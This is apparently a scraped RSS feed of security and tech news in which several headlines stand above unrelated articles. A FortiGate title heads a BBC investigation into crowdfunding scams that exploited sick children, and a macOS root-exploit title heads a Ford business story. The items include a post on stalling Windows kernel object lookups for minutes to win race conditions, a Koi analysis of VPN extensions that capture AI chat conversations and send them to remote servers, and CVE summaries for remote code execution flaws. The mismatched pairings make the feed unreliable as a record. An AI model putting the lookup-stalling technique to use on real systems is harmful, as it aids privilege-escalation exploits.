The results are what we might expect, it seems linear, at least until around 13000 recursive directories where there is a disjoint transition. I ran the test multiple times on the same machine and always got the same issue, however running it on an x64 machine didn’t show the same artifact so I don’t think it’s a problem with the code.Still, it’s unequivocal that the time to lookup an object is linear based on the number of recursive directories. For a 16000 recursive depth the average lookup time is around 1300μs or approximately 40 times larger than the long path name lookup result. Now of course this comes with downsides. For a start you need to create 16000 or so directory objects in the kernel, each directory takes up some amount of kernel pool memory. On a 64 bit platform this is unlikely to be a problem.We also have the setup time to consider, too long and we might still miss the race condition. We can speed up the process of creating the directories by using the ability of Windows system calls to create an object relative to an existing directory. This allows us to avoid parsing the full path for every new directory, which is after all what we’re trying to make slow.Also the process must maintain a handle to each of those directories otherwise they’d be deleted as a normal user can’t make kernel objects permanent. Fortunately our handle limit for a single process is of the order of 16 million so we’re a couple of orders of magnitude below the limit of that.Now is 1300μs going to be enough for us? Maybe, it’s certainly orders of magnitude greater than 2μs for a normal lookup. But can we do better? We’ve run out of path space now, we’ve filled the absolute maximum allowed string length with recursive directory names. What we need is a method of multiplying that effect without requiring a longer path.Here we can use object manager symbolic links. By placing the symbolic link as the last component of the long path we can force the kernel to reparse, and start the lookup all over again. On the final lookup we’ll just point the symbolic link to the target.Through testing we can only redirect using the symbolic link 64 times before receiving an error, why can’t we do this indefinitely? Well for a fairly obvious reason, each time a symbolic link is encountered the kernel restarts the parsing processes, if you pointed a symbolic link at itself you’d end up in an infinite loop. The 64 reparse limit prevents that from becoming a problem. The following code will do this test for us:We only do 10 test iterations to minimize the time we need to run. The results are as we expected, time taken to look up our event is proportional to both the number of symbolic links and the number of recursive directories. For 64 symbolic links and 16000 directories it takes approximately 4.5ms to lookup the event (note I’ve had to change the scale of the result now to milliseconds). That should be enough, right? Maybe, but I’m greedy, I want more. How can we make the lookup time even worse?At this point, it’s time to break out the disassembler and see how the lookup process works under the kernel. First off, let’s see what an object directory structure looks like. We can dump it from a kernel debugging session using WinDBG with the command . Converted back to a C style structure it looks something like the following:Based on the presence of the  field, it’s safe to assume that the kernel is using a hash table to store directory entries. This makes some sense, if the kernel just maintained a list of directory entries it’d be pretty poor for performance, however with a hash table the lookup time is reduced as long as the hashing algorithm does a good job of reducing collisions. This is only the case though if the algorithm isn’t being actively exploited. As we’re trying to increase the cost of lookups we can intentionally add entries with collisions to make the lookup process take the worst case time, which is linear relative to the number of entries in a directory. This again provides us with another scaling factory, and in this case the number of entries is only going to be limited by available memory as we’re never going to need to put the name into the path.So what’s the algorithm for the hash? The main function of interest is  which is referenced by functions such as . The directory entry logic is buried somewhere in this large function, however fortunately there’s a helper function  which has the same logic (it isn’t actually called by  but it doesn’t matter) which is smaller and easier to reverse engineer, the following is a simplified version of that.So the hashing algorithm is pretty simple, it repeatedly mixes the bits of the current hash value then adds the uppercase unicode character to the hash. We could work out a clever way of getting hash collisions from this but actually it’s pretty simple, the object manager allows us to specify names containing NUL characters, therefore if we take our target name, say ‘A’ and prefix it with increasing length strings containing only NUL we get both hash and bucket collisions. Due to the path character limit we can only create 32000 or so colliding entries, but as we’ll see that’s not a problem. The following code will test this behavior:Let’s look at the results of doing this for a single directory:The chart shows a more or less linear graph. For a given collision count it’s nowhere near as good as the recursive directory approach, around 100μs versus 1300μs but it is a multiplicative factor in the lookup time which we can abuse.We can apply this additional factor to all our 16000 recursive directories, add in symbolic links and we’ll probably get an insane lookup time. However there’s a problem, insertion time. Every time we add a new entry to a directory the kernel must do a lookup to check that the entry doesn’t already exist. This means that for every new directory entry we add we must do (n-1) checks in the hash table just to find that we don’t have the entry before we insert it. This means that the time to add a new entry is approximately proportional to the square of the number of entries, sure it’s not a cubic or exponential increase, but that’s hardly a consolation. On the test machine it takes approximately 2.5s (yes seconds) to create a single collision directory with 32000 entries. If we wanted to do that for all 16000 recursive directory entries it would take around 12 hours!Okay I think we’re going a bit over the top here, by fiddling with the values we can get something which doesn’t take too long to set up and gives us a long lookup time. But I’m still greedy. I want to see how far I can push the lookup time, is there any way we can get the best of all worlds?The final piece of the puzzle is to bring in Shadow Directories, which allow the Object Manager a fallback path if it can’t find an entry in a directory. You can use almost any other Object Manager directory as a shadow, which will allow us to control the lookup behavior. A Shadow Directory has a crucial difference from symbolic links, they don’t cause a reparse to occur in the lookup process. This means they’re not restricted to the 64 reparse limit. This doesn’t result in an infinite loop as each lookup consumes a path component, eventually there’ll be no more path to lookup. If we put together two directories in the following arrangement we can pass a similar path to our recursive directory lookup, without actually creating all the directories.
So how does this actually work? If we open a path of the form  the kernel will first lookup the initial A directory. This is the directory on the left of the diagram. It will then try to open the next A directory, which is on the right which again it will find. Next the kernel again looks up A, but in this case it doesn’t exist so as the directory has a shadow link to its parent it looks there instead, finds the same  directory and repeats the process. This will continue until we run out of path elements to look up.So let’s determine the performance of this approach. We’d perhaps expect it to be less performant relative to actually creating all those directories but hopefully it won’t be too far behind. We can use the following code to do the test:And the results are as follows, the chart includes the original test for the normal recursive lookup as well for comparison.Looks good, interestingly based on this test the lookup time is longer for shadow directories than for recursive directories. We still get a weird disjoint region, but in this case it starts earlier, perhaps it’s a cache effect based on the length of the string or something like that?So the final result is that instead of creating 16000 directories with 16000 collisions we can do it with just 2 directories which is far more manageable and only takes around 5 seconds on my workstation. So to sign off let’s combine everything together with the following code which has the following parameters:16000 path components using 2 object directories in a shadow configuration16000 collisions per directory64 symbolic link reparsesAnd the resulting time for a single lookup on the test system is *drum roll please* 3 minutes. I think we might just be able to win the race condition with that.So after all that effort we can make the kernel take around 3 minutes to look up a single controlled resource path. That’s pretty impressive. We have many options to get the kernel to start the lookup process. Both file system and registry end up interacting with the object manager namespace, so for example you could plant an NTFS mount point with the initiating path to cause any process which opens that file to lock up for 3 minutes.After 8 years it’s probably not surprising Microsoft haven’t tried to do anything about this exploit technique. It’s a typical tale of unexpected behavior when facing pathological input, it’s probably not worth the impact on the object manager code to improve performance meaningfully.Just a final point to note on performance. The timings presented here are going to vary wildly based on the performance of the machine so they should only be taken as guidelines. If you look back at the original publication of this post in PoC||GTFO you’ll find the timings are substantially longer. For example, the final test took 19 minutes on the Xeon workstation I used for testing rather than 3 minutes. I don’t know if this is an indication that the ARM64 CPU used in the Surface Pro was substantially faster than the Xeon, or if it was just the amount of cruft which runs on a typical workstation versus a freshly installed Windows 11 Microsoft PC. Regardless, if you can’t exploit the race condition in 3 or 19 minutes then your bug might truly be unexploitable.You can find the full test code on Github.]]></content:encoded></item><item><title>Critical FortiGate Devices SSO Vulnerabilities Actively Exploited in the Wild</title><link>https://cybersecuritynews.com/fortigate-devices-sso-vulnerabilities/</link><author></author><category>security</category><pubDate>Tue, 16 Dec 2025 07:43:17 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Critical FortiGate Devices SSO Vulnerabilities Actively Exploited in the Wild

He is pale and has no hair."I am seven years old and I have cancer," he says. "Please save my life and help me."Khalil - who is pictured above in a still from the film - didn't want to record this, says his mother Aljin. She had been asked to shave his head, and then a film crew hooked him up to a fake drip, and asked his family to pretend it was his birthday. They had given him a script to learn and recite in English.And he didn't like it, says Aljin, when chopped onions were placed next to him, and menthol put under his eyes, to make him cry.Aljin agreed to it because, although the set-up was fake, Khalil really did have cancer. She was told this video would help crowdfund money for better treatment. And it did raise funds - $27,000 (£20,204), according to a campaign we found in Khalil's name.But Aljin was told the campaign had failed, and says she received none of this money - just a $700 (£524) filming fee on the day. One year later, Khalil died.Across the world, desperate parents of sick or dying children are being exploited by online scam campaigns, the BBC World Service has discovered. The public have given money to the campaigns, which claim to be fundraising for life-saving treatment. We have identified 15 families who say they got little to nothing of the funds raised and often had no idea the campaigns had even been published, despite undergoing harrowing filming.Nine families we spoke to - whose campaigns appear to be products of the same scam network - say they never received anything at all of the $4m (£2.9m) apparently raised in their names.A whistleblower from this network told us they had looked for "beautiful children" who "had to be three to nine years old… without hair".We have identified a key player in the scam as an Israeli man living in Canada called Erez Hadari. Watch how three children, including Ana from Colombia, appeared in campaign videosOur investigation began in October 2023, when a distressing YouTube advert caught our attention. "I don't want to die," a girl called Alexandra from Ghana sobbed. "My treatments cost a lot."A crowdfunding campaign for her appeared to have raised nearly $700,000 (£523,797).We saw more videos of sick children from around the world on YouTube, all strikingly similar - slickly produced, and seemingly having raised huge amounts of money. They all conveyed a sense of urgency, using emotive language.We decided to investigate further.The campaigns with the biggest apparent international reach were under the name of an organisation called Chance Letikva (Chance for Hope, in English) - registered in Israel and the US.Identifying the children featured was difficult. We used geolocation, social media and facial recognition software to find their families, based as far apart as Colombia and the Philippines.While it was difficult to know for sure if the campaign websites' cash totals were genuine, we donated small amounts to two of them and saw the totals increase by those amounts.We also spoke to someone who says she gave $180 (£135) to Alexandra's campaign and was then inundated with requests for more, all written as if sent by Alexandra and her father.In the Philippines, Aljin Tabasa told us her son Khalil had fallen ill just after his seventh birthday."When we found out it was cancer it felt like my whole world shattered," she says.Aljin says treatment at their local hospital in the city of Cebu was slow, and she had messaged everyone she could think of for help. One person put her in touch with a local businessman called Rhoie Yncierto - who asked for a video of Khalil which, looking back, Aljin realises was essentially an audition. Another man then arrived from Canada in December 2022, introducing himself as "Erez". He paid her the filming fee up front, she says, promising a further $1,500 (£1,122) a month if the film generated lots of donations.Erez directed Khalil's film at a local hospital, asking for retake after retake - the shoot taking 12 hours, Aljin says.Months later, the family say they had still not heard how the video had performed. Aljin messaged Erez, who told her the video "wasn't successful"."So as I understood it, the video just didn't make any money," she says.But we told her the campaign had apparently collected $27,000 (£20,204) as of November 2024, and was still online."If I had known the money we had raised, I can't help but think that maybe Khalil would still be here," Aljin says. "I don't understand how they could do this to us."When asked about his role in the filming, Rhoie Yncierto denied telling families to shave their children's heads for filming and said he had received no payment for recruiting families.He said he had "no control" over what happened with the funds and had no contact with the families after the day of filming. When we told him they had not received any of the campaigns' donations he said he was "puzzled" and was "very sorry for the families".Nobody named Erez appears on registration documents for Chance Letikva. But two of its campaigns we investigated had also been promoted by another organisation called Walls of Hope, registered in Israel and Canada. Documents list the director in Canada as Erez Hadari.Photos of him online show him at Jewish religious events in the Philippines, New York and Miami. We showed Aljin, and she said it was the same person she had met.We asked Mr Hadari about his involvement in a campaign in the Philippines. He did not respond.We visited further families whose campaigns were either organised by, or linked to, Mr Hadari - one in a remote indigenous community in Colombia, and another in Ukraine.As with Khalil's case, local fixers had got in touch to offer help. The children were filmed and made to cry or fake tears for a nominal fee, but never received any further money.In Sucre, north-west Colombia, Sergio Care says he initially refused this help. He had been approached by someone called Isabel, he says, who offered financial assistance after his eight-year-old daughter, Ana, was diagnosed with a malignant brain tumour.But Isabel came looking for him at the hospital treating Ana, he says, accompanied by a man who said he worked for an international NGO.The description Sergio gave of the man matched that of Erez Hadari - he then recognised him in a photo we showed him."He gave me hope... I didn't have any money for the future."Demands on the family did not end with the filming.Isabel kept ringing, Sergio says, demanding more photos of Ana in hospital. When Sergio didn't reply, Isabel started messaging Ana herself - voice notes we have heard.Ana told Isabel she had no more photos to send. Isabel replied: "This is very bad Ana, very bad indeed."In January this year, Ana - now fully recovered - tried to find out what happened to the money promised."That foundation disappeared," Isabel told her in a voice note. "Your video was never uploaded. Never. Nothing was done with it, you hear?"But we could see the video had been uploaded and, by April 2024, appeared to have raised nearly $250,000 (£187,070).In October, we persuaded Isabel Hernandez to speak to us over video link.A friend from Israel, she explained, had introduced her to someone offering work for "a foundation" looking to help children with cancer. She refused to name who she worked for.She was told only one of the campaigns she helped organise was published, she says, and that it had not been successful.We showed Isabel that two campaigns had in fact been uploaded - one of them apparently raising more than $700,000 (£523,797)."I need to apologise to [the families]," she said. "If I'd known what was going on, I would not have been able to do something like this."In Ukraine, we discovered that the person who approached the mother of a sick child was actually employed in the place where the campaign video was filmed.Tetiana Khaliavka organised a shoot with five-year-old Viktoriia, who has brain cancer, at Angelholm Clinic in Chernivtsi.One Facebook post linked to Chance Letikva's campaign shows Viktoriia and her mother Olena Firsova, sitting on a bed. "I see your efforts to save my daughter, and it deeply moves us all. It's a race against time to raise the amount needed for Viktoriia's treatments," reads the caption.Olena says she never wrote or even said these words and had no idea the campaign had been uploaded.It appears to have raised more than €280,000 (£244,000).Tetiana, we were told, was in charge of advertising and communications at Angelholm.The clinic recently told the BBC it didn't approve filming on its premises - adding: "The clinic has never participated in, nor supported, any fundraising initiatives organised by any organisation."Angelholm says it has terminated Tetiana Khaliavka's employment.Olena showed us the contract she had been asked to sign.In addition to the family's $1,500 (£1,122) filming fee on the day, it states they would get $8,000 (£5,986) once the fundraising goal was met. The amount for the goal, however, has been left blank.The contract showed an address in New York for Chance Letikva. On the organisation's website, there is another - in Beit Shemesh, about an hour from Jerusalem. We travelled to both, but found no sign of it.And we discovered Chance Letikva seems to be one of many such organisations.The man who filmed Viktoriia's campaign told our producer - who was posing as a friend of a sick child - that he works for other similar organisations."Each time, it's a different one," the man - who had introduced himself as "Oleh" - told her. "I hate to put it this way, but they work kind of like a conveyor belt.""About a dozen similar companies" requested "material", he said, naming two of them - Saint Teresa and Little Angels, both registered in the US.When we checked their registration documents, we once again found Erez Hadari's name.What is not clear is where the money raised for the children has gone.More than a year after Viktoriia's filming, her mother Olena rang Oleh, who seems to go by Alex Kohen online, to find out. Shortly afterwards, someone from Chance Letikva called to say the donations had paid for advertising, she says.This is also what Mr Hadari told Aljin, Khalil's mother, when she confronted him over the phone."There is cost of advertising. So the company lost money," Mr Hadari told her, without giving any evidence to support this.Charity experts told us advertising should not amount to more than 20% of the total raised by campaigns.Someone previously employed to recruit children for Chance Letikva campaigns told us how those featured had been chosen.They had been asked to visit oncology clinics, they said - speaking on condition of anonymity."They were always looking for beautiful children with white skin. The child had to be three to nine years old. They had to know how to speak well. They had to be without hair," they told us."They asked me for photos, to see if the child is right, and I would send it to Erez."The whistleblower told us Mr Hadari would then send the photo on to someone else, in Israel, whose name they were never told.As for Mr Hadari himself, we tried to reach him at two addresses in Canada but could not find him. He replied to one voice note we had sent him - asking about the money he had been apparently crowdfunding - by saying the organisation "has never been active", without specifying which one. He did not respond to a further voice note and letter laying out all our questions and allegations.Campaigns set up by Chance Letikva for two children who died - Khalil and a Mexican boy called Hector - still appear to be accepting money.Chance Letikva's US branch appears to be linked to a new organisation called Saint Raphael, which has produced more campaigns - at least two of which seem to have been filmed in Angelholm clinic in Ukraine, as the clinic's distinctive wood panelling and staff uniforms can be seen.Olena, Viktoriia's mother, says her daughter has been diagnosed with another brain tumour. She says she is sickened by the findings of our investigation."When your child is… hanging on the edge of life, and someone's out there, making money off that. Well, it's filthy. It's blood money."The BBC contacted Tetiana Khaliavka and Alex Kohen, and the organisations Chance Letikva, Walls of Hope, Saint Raphael, Little Angels and Saint Teresa - inviting them to respond to the allegations made against them. None of them replied.The Israeli Corporations Authority, which oversees the country's non-profit organisations, told us that if it has evidence founders are using entities as "a cover for illegal activity", then registration inside Israel may be denied and the founder could be barred from working in the sector.UK regulator, the Charity Commission, advises those wishing to donate to charities to check that those associations are registered, and that the appropriate fundraising regulator should be contacted if in doubt.Additional reporting by: Ned Davies, Tracks Saflor, Jose Antonio Lucio, Almudena Garcia-parrado, Vitaliya Kozmenko, Shakked Auerbach, Tom Tzur Wisfelder, Kateryna Malofieieva, Anastasia Kucher, Alan Pulido and Neil McCarthy]]></content:encoded></item><item><title>CVE-2025-14252 - Advantech SUSI Improper Access Control Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-14252</link><author></author><category>vulns</category><pubDate>Tue, 16 Dec 2025 06:15:42 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-14252

Like I've grown used to doing, I opened Claude and started thinking out loud-laying out the options, weighing the tradeoffs, asking for perspective.Midway through the conversation, I paused. I realized how much I'd shared: not just this decision, but months of conversations-personal dilemmas, health questions, financial details, work frustrations, things I hadn't told anyone else. I'd developed a level of candor with my AI assistant that I don't have with most people in my life.And then an uncomfortable thought: what if someone was reading all of this?The thought didn't let go. As a security researcher, I have the tools to answer that question.We asked Wings, our agentic-AI risk engine, to scan for browser extensions with the capability to read and exfiltrate conversations from AI chat platforms. We expected to find a handful of obscure extensions-low install counts, sketchy publishers, the usual suspects.The results came back with something else entirely.Near the top of the list: Urban VPN Proxy. A Chrome extension with over 6 million users. A 4.7-star rating from 58,000 reviews. A "Featured" badge from Google, meaning it had passed manual review and met what Google describes as "a high standard of user experience and design."A free VPN promising privacy and security. Exactly the kind of tool someone installs when they  to protect themselves online.We decided to look closer.Urban VPN Proxy targets conversations across ten AI platforms:For each platform, the extension includes a dedicated "executor" script designed to intercept and capture conversations. The harvesting is enabled by default through hardcoded flags in the extension's configuration:There is no user-facing toggle to disable this. The only way to stop the data collection is to uninstall the extension entirely.The data collection operates independently of the VPN functionality. Whether the VPN is connected or not, the harvesting runs continuously in the background.Here's the technical breakdown:1. Script injection into AI platformsThe extension monitors your browser tabs. When you visit any of the targeted AI platforms (ChatGPT, Claude, Gemini, etc.), it injects an "executor" script directly into the page. Each platform has its own dedicated script - chatgpt.js, claude.js, gemini.js, and so on.2. Overriding native browser functionsOnce injected, the script overrides fetch() and XMLHttpRequest - the fundamental browser APIs that handle all network requests. This is an aggressive technique. The script wraps the original functions so that every network request and response on that page passes through the extension's code first.This means when Claude sends you a response, or when you submit a prompt to ChatGPT, the extension sees the raw API traffic before your browser even renders it.The injected script parses the intercepted API responses to extract conversation data - your prompts, the AI's responses, timestamps, conversation IDs. This data is packaged and sent via window.postMessage to the extension's content script, tagged with the identifier PANELOS_MESSAGE.4. Exfiltration via background workerThe content script forwards the data to the extension's background service worker, which handles the actual exfiltration. The data is compressed and transmitted to Urban VPN's servers at endpoints including analytics.urban-vpn.com and stats.urban-vpn.com.Every prompt you send to the AIEvery response you receiveConversation identifiers and timestampsThe specific AI platform and model usedThe AI conversation harvesting wasn't always there. Based on our analysis:: No AI harvesting functionality: Version 5.5.0 released with AI harvesting enabled by default: All user conversations with targeted AI platforms captured and exfiltratedChrome and Edge extensions auto-update by default. Users who installed Urban VPN for its stated purpose - VPN functionality - woke up one day with new code silently harvesting their AI conversations.Anyone who used ChatGPT, Claude, Gemini, or the other targeted platforms while Urban VPN was installed after July 9, 2025 should assume those conversations are now on Urban VPN's servers and have been shared with third parties. Medical questions, financial details, proprietary code, personal dilemmas - all of it, sold for "marketing analytics purposes."What "AI Protection" Actually DoesUrban VPN's Chrome Web Store listing promotes "AI protection" as a feature:"Advanced VPN Protection - Our VPN provides added security features to help shield your browsing experience from phishing attempts, malware, intrusive ads and AI protection which checks prompts for personal data (like an email or phone number), checks AI chat responses for suspicious or unsafe links and displays a warning before click or submit your prompt."The framing suggests the AI monitoring exists to  you-checking for sensitive data you might accidentally share, warning you about suspicious links in responses.The code tells a different story. The data collection and the "protection" notifications operate independently. Enabling or disabling the warning feature has no effect on whether your conversations are captured and exfiltrated. The extension harvests everything regardless.The protection feature shows occasional warnings about sharing sensitive data with AI companies. The harvesting feature sends that exact sensitive data - and everything else - to Urban VPN's own servers, where it's sold to advertisers. The extension warns you about sharing your email with ChatGPT while simultaneously exfiltrating your entire conversation to a data broker.After documenting Urban VPN Proxy's behavior, we checked whether the same code existed elsewhere.It did. The identical AI harvesting functionality appears in seven other extensions from the same publisher, across both Chrome and Edge:Urban VPN Proxy - 6,000,000 users1ClickVPN Proxy - 600,000 usersUrban Browser Guard - 40,000 usersUrban Ad Blocker - 10,000 usersUrban VPN Proxy - 1,323,622 users1ClickVPN Proxy - 36,459 usersUrban Browser Guard - 12,624 usersUrban Ad Blocker - 6,476 usersTotal affected users: Over 8 million.The extensions span different product categories, a VPN, an ad blocker, a "browser guard" security tool, but share the same surveillance backend. Users installing an ad blocker have no reason to expect their Claude conversations are being harvested.All of these extensions carry "Featured" badges from their respective stores, except Urban Ad Blocker for Edge. These badges signal to users that the extensions have been reviewed and meet platform quality standards. For many users, a Featured badge is the difference between installing an extension and passing it by - it's an implicit endorsement from Google and Microsoft.Urban VPN is operated by Urban Cyber Security Inc., which is affiliated with BiScience (B.I Science (2009) Ltd.), a data broker company.This company has been on researchers' radar before. Security researchers Wladimir Palant and John Tuckner at Secure Annex have previously documented BiScience's data collection practices. Their research established that:BiScience collects clickstream data (browsing history) from millions of usersData is tied to persistent device identifiers, enabling re-identificationThe company provides an SDK to third-party extension developers to collect and sell user dataBiScience sells this data through products like AdClarity and Clickstream OSOur finding represents an expansion of this operation. BiScience has moved from collecting browsing history to harvesting complete AI conversations-a significantly more sensitive category of data.The privacy policy confirms the data flow:"We share the Web Browsing Data with our affiliated company... BiScience that uses this raw data and creates insights which are commercially used and shared with Business Partners"To be fair, Urban VPN does disclose some of this-if you know where to look. (shown during extension setup) mentions that the extension processes "ChatAI communication" along with "pages you visit" and "security signals." It states this is done "to provide these protections." goes further, buried deep in the document:"AI Inputs and Outputs. As part of the Browsing Data, we will collect the prompts and outputs queried by the End-User or generated by the AI chat provider, as applicable.""We also disclose the AI prompts for marketing analytics purposes."However, the Chrome Web Store listing-the place where users actually decide whether to install-shows a different picture:"This developer declares that your data is Not being sold to third parties, outside of the approved use cases"The listing mentions the extension handles "Web history" and "Website content." It says nothing about AI conversations specifically.The contradictions are significant:The consent prompt frames AI monitoring as protective. The privacy policy reveals the data is sold for marketing.The store listing says data isn't sold to third parties. The privacy policy describes sharing with BiScience, "Business Partners," and use for "marketing analytics."Users who installed before July 2025 never saw the updated consent prompt-the AI harvesting was added via silent update in version 5.5.0.Even users who see the consent prompt have no granular control. You can't accept the VPN but decline the AI harvesting. It's all or nothing.Nothing indicates to users that the data collection continues even when the VPN is disconnected and the AI protection feature is turned off. The harvesting runs silently in the background regardless of what features the user has enabled.Urban VPN Proxy carries Google's "Featured" badge on the Chrome Web Store. According to Google's documentation:"Featured extensions follow our technical best practices and meet a high standard of user experience and design.""Before it receives a Featured badge, the Chrome Web Store team must review each extension."This means a human at Google reviewed Urban VPN Proxy and concluded it met their standards. Either the review didn't examine the code that harvests conversations from Google's own AI product (Gemini), or it did and didn't consider this a problem.The Chrome Web Store's Limited Use policy explicitly prohibits "transferring or selling user data to third parties like advertising platforms, data brokers, or other information resellers." BiScience is, by its own description, a data broker.The extension remains live and featured as of this writing.Browser extensions occupy a unique position of trust. They run in the background, have broad access to your browsing activity, and auto-update without asking. When an extension promises privacy and security, users have little reason to suspect it's doing the opposite.What makes this case notable isn't just the scale - 8 million users - or the sensitivity of the data - complete AI conversations. It's that these extensions passed review, earned Featured badges, and remained live for months while harvesting some of the most personal data users generate online. The marketplaces designed to protect users instead gave these extensions their stamp of approval.If you have any of these extensions installed, uninstall them now. Assume any AI conversations you've had since July 2025 have been captured and shared with third parties.This writeup was authored by the research team at Koi.We built Koi to detect exactly these kinds of threats - extensions that slip past marketplace reviews and quietly exfiltrate sensitive data. Our risk engine, Wings, continuously monitors browser extensions to catch threats before they reach your team. to see how behavioral analysis catches what static review misses.Urban VPN Proxy: eppiocemhmnlbhjplcgkofciiegomconUrban Browser Guard: almalgbpmcfpdaopimbdchdliminoignUrban Ad Blocker: feflcgofneboehfdeebcfglbodaceghj1ClickVPN Proxy for Chrome: pphgdbgldlmicfdkhondlafkiomnelnkUrban VPN Proxy: nimlmejbmnecnaghgmbahmbaddhjbecgUrban Browser Guard: jckkfbfmofganecnnpfndfjifnimpcelUrban Ad Blocker: gcogpdjkkamgkakkjgeefgpcheonclca1ClickVPN Proxy for Edge: deopfbighgnpgfmhjeccdifdmhcjckoe]]></content:encoded></item><item><title>Enterprise Alert: Windows 10 Update KB5071546 Breaks MSMQ Service with Insufficient Permissions</title><link>https://securityonline.info/enterprise-alert-windows-10-update-kb5071546-breaks-msmq-service-with-insufficient-permissions/</link><author></author><category>security</category><pubDate>Tue, 16 Dec 2025 02:29:45 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Enterprise Alert: Windows 10 Update KB5071546 Breaks MSMQ Service with Insufficient Permissions

DeepChat is an open-source artificial intelligence agent platform that unifies models, tools, and agents. Prior to version 0.5.3, a security vulnerability exists in the Mermaid diagram rendering component that allows arbitrary JavaScript execution. Due to the exposure of the Electron IPC renderer to the DOM, this Cross-Site Scripting (XSS) flaw escalates to full Remote Code Execution (RCE), allowing an attacker to execute arbitrary system commands. Two concurrent issues, unsafe Mermaid configuration and an exposed IPC interface, cause this issue. Version 0.5.3 contains a patch.

ConvertXis a self-hosted online file converter. In versions prior to 0.16.0, the endpoint `/upload` allows an authenticated user to write arbitrary files on the system, overwriting binaries and allowing code execution. The upload function takes `file.name` directly from user supplied data without doing any sanitization on the name thus allowing for arbitrary file write. This can be used to overwrite system binaries with ones provided from an attacker allowing full code execution. Version 0.16.0 contains a patch for the issue.

need. We're hungry for less, while more accumulates and multiplies.We're hungry and we don't have words to articulate why.We're hungry, and we're lacking and we're wanting.We are living with a near-universal thin desire: wanting something that cannot actually be gotten, that we can't define, from a source that has no interest in providing it.The distinction between thick and thin desires isn't original to me.Philosophers have been circling this territory for decades, from Charles Taylor's work on frameworks of meaning to Agnes Callard's more recent writing on aspiration.But the version I find most useful is simple:A thick desire is one that changes you in the process of pursuing it.A thin desire is one that doesn't.The desire to understand calculus versus the desire to check your notifications are both real desires, and both produce (to a degree) real feelings of satisfaction when fulfilled.But the person who spends a year learning calculus becomes someone different, someone who can see patterns in the world that were previously invisible, who has expanded the range of things they're capable of caring about, who has Been Through It.The person who checks their notifications is, afterward, exactly the same person who wanted to check their notifications five minutes ago.The thin desire reproduces itself without remainder.The thick desire transforms its host.I want to be careful here because this is a claim that can easily slide into unfalsifiable grumpiness about Kids These Days.But there's a version of it that I think is both true and important.The business model of most consumer technology is to identify some thick desire, find the part of it that produces a neurological reward, and then deliver that reward without the rest of the package.Social media gives you the feeling of social connection without the obligations of actual friendship.Pornography gives you sexual satisfaction without the vulnerability of partnership.Productivity apps give you the feeling of accomplishment without anything being accomplished.In each case, the thin version is easier to deliver at scale, easier to monetize, and easier to make addictive.The result is a diet of pure sensation.And none of it seems to be making anyone happier.The surveys all point the same direction: rising anxiety, rising depression, rising rates of loneliness even as we've never been more connected.How could this be, when we've gotten so good at giving people what they want?Maybe because we've gotten good at giving people what they want in a way that prevents them from wanting anything worth having.Thick desires are inconvenient.They take years to cultivate and can't be satisfied on demand.The desire to master a craft, to read slowly, to be embedded in a genuine community, to understand your place in some tradition larger than yourself: these desires are effortful to acquire and impossible to fully gratify.They embed you in webs of obligation and reciprocity.They make you dependent on specific people and places.From the perspective of a frictionless global marketplace, all of this is pure inefficiency.And so the infrastructure for thick desires has been gradually dismantled.The workshops closed, the congregations thinned, the apprenticeships disappeared, the front porches gave way to backyard decks and studio apartments and the coveted Micro Homes where you could be alone with your devices.Meanwhile the infrastructure for thin desires became essentially inescapable.It's in your pocket right now.Grand programs to Rebuild Community or Restore Meaning seem to founder on the same logic they're trying to escape.The thick life doesn't scale.The yeast doesn't care about your schedule.The dough will rise when it rises, indifferent to your optimization.You'll spend an afternoon doing something that cannot be made faster, producing something that you could have bought for four dollars, and in the process you'll recover some capacity for patience that the attention economy has been methodically stripping away.Write a letter, by hand, on paper.Send it through the mail.The letter will take days to arrive and you won't be able to unsend it or edit it or track whether it was opened.You're creating a communication that exists outside the logic of engagement metrics, a small artifact that refuses to be optimized.Code a tool for exactly one person.Solve your friend's specific problem with their specific workflow.Build something that will never scale, never be monetized, never attract users.The entire economy of software assumes that code should serve millions to justify its existence.Making something for an audience of one is a beautiful heresy.None of this will reverse the great thinning.But I've started to suspect that the thick life might be worth pursuing anyway, on its own terms, without needing to become a movement.The person who bakes bread isn't trying to fix the world. They're not making any attempt to either dent or undent the universe.They're trying to spend a Sunday afternoon in a way that doesn't leave them feeling emptied out.They're remembering, one loaf at a time, what it feels like to want something that's actually worth wanting.]]></content:encoded></item><item><title>macOS LPE Flaw Resurfaces: .localized Directory Exploited to Hijack Installers and Gain Root Access</title><link>https://securityonline.info/macos-lpe-flaw-resurfaces-localized-directory-exploited-to-hijack-installers-and-gain-root-access/</link><author></author><category>security</category><pubDate>Tue, 16 Dec 2025 00:40:04 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

The automaker will make hybrid versions of almost every vehicle in its lineup, the company says.The new plans leave Ford with a bunch of excess battery-making capacity, which the company says it will use by opening a whole new business: a battery energy-storage sideline. This new business will produce lower-cost and longer-living lithium iron phosphate, or LFP, batteries for customers in the public utility or data center industries.“Ford is following the customer,” says Andrew Frick, the president of Ford Blue and Ford Model e, the automaker’s gas- and battery-powered vehicle businesses. US customer adoption of electric vehicles is not where the industry expected at decade’s start, he says. (Battery-electric vehicles currently make up about 7.5 percent of US new car sales.) Frick also cited changes in the regulatory environment, including the Trump administration's rollback of commercial and consumer tax incentives for electric vehicles.The company has also canceled an all-electric commercial van planned for the European market. Instead, Ford will team up with Renault, in a partnership announced last week, to develop at least two small Ford-branded electric vehicles for Europe—a move that CEO Jim Farley called part of a “fight for our lives,” as US automakers try to compete with affordable EVs out of China.Ford said Monday that it also plans to produce a new gas-powered commercial van for North America.]]></content:encoded></item><item><title>Fix HDMI-CEC weirdness with a Raspberry Pi and a $7 cable</title><link>https://johnlian.net/posts/hdmi-cec/</link><author>jlian</author><category>dev</category><pubDate>Mon, 15 Dec 2025 21:37:09 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[For years I treated HDMI-CEC like a house spirit: sometimes helpful, mostly temperamental, never fully understood. My living-room stack is straightforward: Samsung TV on ARC (NOT eARC - story for another day), Denon AVR-X1700H hidden in a closet, Apple TV plus a bunch of consoles connected to the receiver, and a Raspberry Pi 4 already doing Homebridge duty. When it comes to 